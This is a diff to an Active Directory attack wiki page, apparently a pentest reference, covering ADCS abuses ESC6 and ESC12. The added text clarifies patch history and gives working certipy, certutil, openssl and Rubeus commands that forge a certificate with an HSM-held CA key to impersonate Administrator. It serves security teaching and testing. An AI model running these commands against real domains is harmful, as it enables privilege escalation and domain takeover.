@@ -18,7 +18,11 @@ If the CA is configured with the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins t
 
 <Callout type="error">
 
-[May 2022 security updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) broke the ESC6 attack.
+The May 2022 patch wave ([KB5014754](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)) broke the ESC6 attack by introducing the `szOID_NTDS_CA_SECURITY_EXT` security extension, which embeds the requester's SID in issued certificates and so prevents SAN-based impersonation.
+
+[CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) ([Certifried](/ad/movement/ad-cs/certifried)) is a **separate vulnerability** fixed in the same patch cycle. It is distinct from ESC6.
+
+ESC6 may still be exploitable where `StrongCertificateBindingEnforcement` is set to `0`, which disables strong mapping enforcement entirely.
 
 </Callout>
 
@@ -61,7 +65,7 @@ certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -tem
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
 ```
 
-The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate.
 
 </Tab>
 
@@ -86,7 +90,7 @@ Once the right template is found (i.e. the default **User** template), a request
 Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate.
 
 </Tab>
 </Tabs>
@@ -121,30 +125,64 @@ Generally USB device server solutions can't connect the device to multiple syste
 
 #### **Forge a certificate**
 
-If the CA's private key is stored on a physical USB device such as "YubiHSM2", and a shell access is obtained on the PKI server (even with low privileges), it is possible to recover the key.
+If the CA's private key is stored on a physical USB device such as "YubiHSM2", and shell access is obtained on the PKI server (even with low privileges), it is possible to **sign new certificates with that key**. The key itself never leaves the HSM, but it can be used, which is enough to replicate an [ESC1](/ad/movement/ad-cs/certificate-templates) abuse path and impersonate privileged users.
 
 <Tabs items={['UNIX-like', 'Windows']}>
 <Tab value="UNIX-like">
 
-
+At the time of writing, no solution exists to perform this attack from a UNIX-like machine.
 
 </Tab>
 
 <Tab value="Windows">
 
+First, obtain a valid certificate and split it into its certificate and key parts:
+
+```powershell
+certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p "$PASSWORD" -template User -ca <CA-Common-Name>
+certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
+certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
+```
+
 From a Windows machine, as a low privileged user connected into the CA server, obtain the CA certificate (it is public) and import it to the user store:
 
 ```powershell
-certutil -addstore -user my
+certutil -addstore -user my ./root-ca.cer
 ```
 
 Next, the certificate must be associated to the private key in the YubiHSM2 device:
 
 ```powershell
-certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my
+certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
 ```
 
-Finally, use the CA certificate and its private key with the [`certutil -sign`](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil#-sign) command to forge new arbitrary certificates.
+<Callout type="info">
+
+Ignore any `CRYPT_E_EXISTS` error at this point.
+
+</Callout>
+
+Use the CA certificate and its private key with the [`certutil -sign`](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil#-sign) command to forge new arbitrary certificates.
+
+```powershell
+certutil -sign ./user_esc12.crt new.crt @extension.inf
+```
+
+The following `.inf` file adds a custom `SubjectAltName`, in the same way as the ESC1 abuse:
+
+```ini
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "UPN=Administrator@esc.local&"
+```
+
+Finally, rebuild the PFX and use it to request a TGT as a privileged user:
+
+```powershell
+openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
+
+Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
+```
 
 </Tab>
 </Tabs>
